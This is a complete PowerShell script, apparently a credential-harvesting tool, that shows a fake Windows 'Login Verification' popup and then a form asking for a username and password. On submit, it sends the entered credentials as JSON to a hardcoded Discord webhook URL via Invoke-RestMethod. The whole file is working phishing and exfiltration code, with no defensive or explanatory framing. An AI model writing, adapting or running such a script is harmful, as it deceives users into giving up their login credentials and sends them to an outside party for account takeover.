
Add-Type -AssemblyName PresentationFramework

# Create the fake Windows 11 pop up
$popup = New-Object -TypeName System.Windows.Window
$popup.Title = "Login Verification"
$popup.Width = 400
$popup.Height = 300
$popup.WindowStartupLocation = "CenterScreen"

$label = New-Object -TypeName System.Windows.Controls.Label
$label.Content = "Your Login could not be verified. Please log in again to continue."
$label.HorizontalAlignment = "Center"
$label.VerticalAlignment = "Center"

$button = New-Object -TypeName System.Windows.Controls.Button
$button.Content = "OK"
$button.Add_Click({
    # Create the pop up window for entering username and password
    $credentials = New-Object -TypeName System.Windows.Window
    $credentials.Title = "Enter Credentials"
    $credentials.Width = 200
    $credentials.Height = 200
    $credentials.WindowStartupLocation = "CenterScreen"

    $usernameLabel = New-Object -TypeName System.Windows.Controls.Label
    $usernameLabel.Content = "Username:"
    $usernameLabel.Margin = "20"

    $usernameTextBox = New-Object -TypeName System.Windows.Controls.TextBox
    $usernameTextBox.Margin = "20"

    $passwordLabel = New-Object -TypeName System.Windows.Controls.Label
    $passwordLabel.Content = "Password:"
    $passwordLabel.Margin = "20"

    $passwordBox = New-Object -TypeName System.Windows.Controls.PasswordBox
    $passwordBox.Margin = "20"

    $submitButton = New-Object -TypeName System.Windows.Controls.Button
    $submitButton.Content = "Submit"
    $submitButton.Margin = "20"
    $submitButton.Add_Click({
        $username = $usernameTextBox.Text
        $password = $passwordBox.Password

        # Send the username and password to the Discord webhook
       $body = @{
    content = "Credentials"
    embeds = @(
        @{
            title = "User & Pass"
            fields = @(
                @{ name = "Username:"; value = $username; inline = $true }
                @{ name = "Password:"; value = $password; inline = $true }
            )
        }
    )
} | ConvertTo-Json -Depth 5

        Invoke-RestMethod -Uri "https://discordapp.com/api/webhooks/1463689444774379520/MJ-00krris8ZWhHjeOd_HK6sdu6yHLKx9RpyaPsJE_-FdsA6kO3A8wjfEtA7FgpyoieQ" -Method Post -Body $body -ContentType "application/json"

        $credentials.Close()
    })

    $credentials.Content = New-Object -TypeName System.Windows.Controls.StackPanel
    $credentials.Content.Children.Add($usernameLabel)
    $credentials.Content.Children.Add($usernameTextBox)
    $credentials.Content.Children.Add($passwordLabel)
    $credentials.Content.Children.Add($passwordBox)
    $credentials.Content.Children.Add($submitButton)

    $credentials.ShowDialog()
})

$popup.Content = New-Object -TypeName System.Windows.Controls.StackPanel
$popup.Content.Children.Add($label)
$popup.Content.Children.Add($button)

$popup.ShowDialog()
